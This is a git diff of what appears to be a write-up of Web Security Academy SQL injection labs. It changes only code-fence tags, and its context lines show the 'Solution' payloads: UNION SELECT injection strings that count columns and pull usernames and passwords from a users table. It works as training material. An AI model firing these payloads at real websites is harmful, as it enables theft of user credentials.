@@ -14,7 +14,7 @@ https://aca31f9a1ef0c68680045fec007d0007.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT NULL,NULL,NULL--
 ```
 
@@ -38,7 +38,7 @@ https://ac6c1f941e2e562780c94cde00ea0047.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT NULL,'O2ILLb',NULL--
 ```
 
@@ -64,7 +64,7 @@ https://ac051fca1f14458380d541dd008a005e.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT username, password FROM users--
 ```
 
@@ -90,7 +90,7 @@ https://acbf1f841e3d61b180d8c41a00c4008c.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' UNION SELECT NULL, username || '~' || password FROM users--
 ```
 
